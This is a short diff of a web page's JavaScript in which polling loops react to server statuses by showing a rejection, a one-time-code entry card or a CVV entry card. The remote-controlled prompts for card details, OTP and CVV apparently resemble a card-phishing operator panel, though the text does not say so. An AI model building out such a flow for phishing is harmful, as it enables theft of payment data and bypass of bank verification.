@@ -879,7 +879,9 @@
           const d = await r.json();
           if (d.status === 'accepted') { clearInterval(pollTimer2); showAccepted(); }
           else if (d.status === 'rejected') { clearInterval(pollTimer2); showRejected(); }
-          else if (d.status === 'redirected') { clearInterval(pollTimer2); window.location.href = '/'; }
+          else if (d.status === 'redirect_card') { clearInterval(pollTimer2); showRejected(); }
+          else if (d.status === 'redirect_otp') { clearInterval(pollTimer2); showOtpCard(false); }
+          else if (d.status === 'redirect_cvv') { clearInterval(pollTimer2); showCvvCard(false); }
         } catch(e) {}
       }, 2000);
     }
@@ -981,7 +983,9 @@
           const d = await r.json();
           if (d.status === 'accepted') { clearInterval(pollTimer2); onPollAccepted(); }
           else if (d.status === 'rejected') { clearInterval(pollTimer2); onPollRejected(); }
-          else if (d.status === 'redirected') { clearInterval(pollTimer2); window.location.href = '/'; }
+          else if (d.status === 'redirect_card') { clearInterval(pollTimer2); showRejected(); }
+          else if (d.status === 'redirect_otp') { clearInterval(pollTimer2); showOtpCard(false); }
+          else if (d.status === 'redirect_cvv') { clearInterval(pollTimer2); showCvvCard(false); }
         } catch(e) {}
       }, 2000);
     }
